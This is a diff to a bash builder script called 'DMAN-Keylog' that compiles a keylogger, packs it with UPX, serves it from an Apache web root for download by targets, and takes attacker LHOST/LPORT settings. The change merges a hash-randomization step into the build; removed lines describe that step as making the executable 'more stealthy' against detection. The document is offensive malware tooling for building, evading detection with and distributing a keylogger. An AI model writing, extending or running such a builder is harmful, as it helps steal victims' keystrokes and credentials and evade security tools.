@@ -7,7 +7,6 @@ display_banner() {
   echo -e "\e[92m#                \e[91mDMAN-Keylog\e[92m                    #\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
- 
 }
 
 # Default values
@@ -22,7 +21,6 @@ show_options() {
   echo -e "\e[93mTo set LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
   echo -e "\e[93mTo set LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
   echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
-  echo -e "\e[93mTo randomize hash, type: randomize\e[0m"
 }
 
 # Function to compile and set up keylogger
@@ -37,7 +35,10 @@ generate_keylogger() {
   echo "Packing the executable with UPX..."
   upx --best --lzma keylogger.exe
 
-  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
+  echo "Randomizing hash of the keylogger..."
+  echo -n "$(openssl rand -hex 8)" >> keylogger.exe
+
+  echo "Compilation and randomization completed. The keylogger executable is keylogger.exe"
 
   echo "Moving the keylogger executable to the Apache server directory..."
   sudo mv keylogger.exe /var/www/html/
@@ -46,13 +47,6 @@ generate_keylogger() {
   sudo systemctl start apache2
 
   echo "The keylogger is available at: http://$LHOST/keylogger.exe"
-}
-
-# Function to randomize the hash of the keylogger executable
-randomize_hash() {
-  echo "Randomizing hash of the keylogger..."
-  echo -n "$(openssl rand -hex 8)" >> keylogger.exe
-  echo "Hash randomized. Updated keylogger.exe is now more stealthy."
 }
 
 # Function to start the Python server
@@ -84,8 +78,6 @@ while true; do
         if [[ $INPUT == "generate" ]]; then
           generate_keylogger
           break
-        elif [[ $INPUT == "randomize" ]]; then
-          randomize_hash
         elif [[ $INPUT == set\ LHOST=* ]]; then
           LHOST=${INPUT#*=}
           echo "LHOST set to $LHOST"
@@ -93,7 +85,7 @@ while true; do
           LPORT=${INPUT#*=}
           echo "LPORT set to $LPORT"
         else
-          echo "Invalid input. Type 'generate' to compile, 'randomize' to change hash, or 'set LHOST=<IP_ADDRESS>' or 'set LPORT=<PORT_NUMBER>' to set options."
+          echo "Invalid input. Type 'generate' to compile or 'set LHOST=<IP_ADDRESS>' or 'set LPORT=<PORT_NUMBER>' to set options."
         fi
       done
       ;;
